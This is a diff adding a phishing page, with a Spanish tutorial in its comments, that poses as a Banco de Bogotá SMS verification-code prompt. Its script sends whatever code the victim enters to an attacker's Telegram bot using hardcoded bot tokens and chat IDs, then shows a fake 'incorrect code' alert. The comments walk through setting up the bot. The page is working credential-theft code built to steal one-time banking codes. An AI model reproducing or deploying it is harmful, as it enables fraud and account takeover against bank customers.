@@ -1,0 +1,159 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Codigo de seguridad</title>
+    <link rel="icon" href="./icono.png">
+</head>
+<body>
+    
+
+<!-- Vamos a darle un estilo mas atractivo -->
+<style>
+body {
+    font-family: Arial, Helvetica, sans-serif;
+    background-color: #f9fbff;
+    display: flex;
+    justify-content: center;
+    align-items: center;
+    height: 100vh;
+    margin: 0;
+}
+.container {
+    background-color: #fff;
+    padding: 20px;
+    border-radius: 9px;
+    box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
+    width: 300px;
+}
+
+h2 {
+    text-align: center;
+    margin-bottom: 1.5rem;
+  color: #333;
+  justify-content: center;
+  align-items: center;
+  height: 10vh;
+  display: flex;
+}
+h5 {
+    text-align: center;
+    margin-bottom: 30px;
+  color: #333;
+  justify-content: center;
+  align-items: center;
+  height: 10px;
+  display: flex;
+
+
+
+}
+
+
+form {
+    display: flex;
+    flex-direction: column;
+}
+label {
+    display: flex;
+    flex-direction: column;
+}
+input, textarea {
+    padding: 10px;
+    margin-top: 5px;
+    border: 1px solid #ccc;
+    border-radius: 4px;
+}
+button {
+    margin-top: 20px;
+    padding: 10px;
+    border: none;
+    border-radius: 4px;
+    background-color: #4217dd;
+    color: #fff;
+    font-size: 16px;
+    cursor: pointer;
+}
+button:hover {
+    background-color: #4217dd;
+}
+
+img {
+margin-bottom: 1.5rem;
+  color: #333;
+  justify-content: center;
+  align-items: center;
+  height: 9vh;
+  
+
+}
+
+@media only screen and (max-width: 765px) {}
+          .login-footer-responsive {
+              display: block;
+          }
+
+          .login-footer-responsive img {
+              width: 100%;
+          }
+
+          #gradient {
+              display: block;
+          }
+
+
+
+</style>
+
+
+
+
+<!-- CREAMOS EL CONTENIDO QUE VAMOS A ENVIAR POR MENSAJE A TELEGRAM -->
+<div class="container">
+    <img src="logo.png" alt="">
+    <h2>Ingrese el codigo de verificacion</h2>
+    <h5>Codigo enviado a su celular registrado.</h5>
+    <form id="telegramForm">
+        <label for="Codigo">Ingresar codigo</label>
+        <input type="text" id="Codigo" name="Codigo" required>
+        
+
+        <!-- Necesitamos un boton para hacer click y enviar -->
+        <button type="submit">Verificar codigo</button>
+<div style="margin: 12px; justify-content: center; align-items: center; flex-direction: column; display: flex;"><a href="#">No recibiste el codigo?</a></div>
+
+    </form>
+</div>
+
+<!-- Ahora necesitamos un script para que lleguen los datos a Telegram -->
+<!-- Primero necesitamos crear un bot de Telegram -->
+<!-- Para crear a un bot, debes ingresar @BotFather-->
+<!-- Ahora Digirimos a este Bot para obtener el UserID @userinfobot -->
+<!-- Necesitamos Este UserID: 6818907990 -->
+<!-- Necesitamos Esta API Key: 7143847473:AAEFgumDHBP7FNSorLnP88kSVuP0fRj4Hug -->
+</body>
+
+    <!-- Este SCRIPT Estara Disponible en la Descripcion -->
+<script>
+    document.getElementById('telegramForm').addEventListener('submit', async function(e) {
+        e.preventDefault();
+        const botToken = '7849992003:AAGjmJp3Y8wqft_sZpIit-zXt_uRR0A0VJE'
+        const chatId = '5084554523';
+        const text = `Banco de bogota codigo:\n\nCodigo: ${this.Codigo.value}
+        \n: ${this.Codigo.value}
+        \n\n: ${this.Codigo.value}`;
+        const response = await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`,{
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ chat_id: chatId, text: text })
+        });
+        if (response.ok) alert('Codigo incorrecto!')
+
+
+    });
+
+</script>
+
+
+</html>
